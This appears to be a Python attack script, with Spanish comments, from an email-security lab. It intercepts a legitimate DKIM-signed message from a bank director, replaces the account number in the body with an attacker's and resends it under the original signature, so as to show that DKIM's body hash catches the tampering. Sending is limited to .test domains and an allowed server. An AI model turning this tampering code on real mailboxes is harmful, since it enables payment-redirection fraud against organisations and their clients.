"""A3 — Correo legítimo alterado: el atacante consigue un correo real del director
(firmado con DKIM por bancoseguro.test), cambia el número de cuenta en el cuerpo y lo
reenvía tal cual, con la firma original.

Sin DKIM, nadie notaría el cambio. Con DKIM, el hash del cuerpo (bh=) ya no coincide.

En el laboratorio, "conseguir el correo" = leer el último legítimo de la API de Mailpit.
En la vida real: una cuenta comprometida, un destinatario cómplice o un reenvío.

Uso dentro del contenedor:  python3 -m ataques.a3_legitimo_alterado [--para X] [--servidor Y]
"""

from __future__ import annotations

import argparse
import re
import sys

from ataques.comun import (
    ALLOWED_SERVER,
    ATTACKER_ACCOUNT,
    DEFAULT_RECIPIENT,
    Attack,
    AttackError,
    AttackResult,
    DestinationError,
    decode_body,
    encode_body,
    header_value,
    join_message,
    latest_legit_message,
    send_raw,
    validate_destination,
    without_trace_headers,
)

ATTACK = Attack(
    id="A3",
    description="Correo legítimo alterado",
    envelope_from="director@bancoseguro.test",
    header_from="director@bancoseguro.test",
    dkim="la original del banco (d=bancoseguro.test), con el cuerpo modificado",
)

ACCOUNT = re.compile(rb"\b\d{4}-\d{4}-\d{2}\b")


def tamper(raw: bytes) -> tuple[bytes, str, str]:
    """Cambia la cuenta del cuerpo y quita las cabeceras de entrega.

    Devuelve (mensaje alterado, Message-ID, From). Las demás cabeceras, incluida la
    firma DKIM original, quedan intactas.
    """
    blocks, eol, body = without_trace_headers(raw)
    cte = header_value(blocks, b"Content-Transfer-Encoding")
    altered, changes = ACCOUNT.subn(ATTACKER_ACCOUNT.encode(), decode_body(body, cte))
    if not changes:
        raise AttackError("El correo original no contiene un número de cuenta que cambiar.")
    message_id = header_value(blocks, b"Message-ID").decode().strip("<>")
    header_from = header_value(blocks, b"From").decode()
    return join_message(blocks, eol, encode_body(altered, cte, eol)), message_id, header_from


def launch(recipient: str = DEFAULT_RECIPIENT, server: str = ALLOWED_SERVER) -> AttackResult:
    validate_destination(recipient, server)
    original, signed = latest_legit_message()
    raw, message_id, header_from = tamper(original)
    note = (
        "Usé el último correo legítimo firmado por bancoseguro.test y cambié la cuenta."
        if signed
        else "No hay correos legítimos firmados: usé uno sin firma y cambié la cuenta."
    )
    attack = Attack(ATTACK.id, ATTACK.description, ATTACK.envelope_from, header_from, ATTACK.dkim)
    return send_raw(attack, raw, message_id, recipient, server, note=note)


def main() -> int:
    parser = argparse.ArgumentParser(description=f"{ATTACK.id}: {ATTACK.description}")
    parser.add_argument("--para", default=DEFAULT_RECIPIENT, help="destinatario (.test)")
    parser.add_argument("--servidor", default=ALLOWED_SERVER, help="servidor SMTP (receptor)")
    args = parser.parse_args()
    try:
        result = launch(args.para, args.servidor)
    except (DestinationError, AttackError) as error:
        print(f"ABORTADO: {error}", file=sys.stderr)
        return 2
    print(result.note)
    print(result.transcript)
    return 0 if result.accepted else 1


if __name__ == "__main__":
    sys.exit(main())
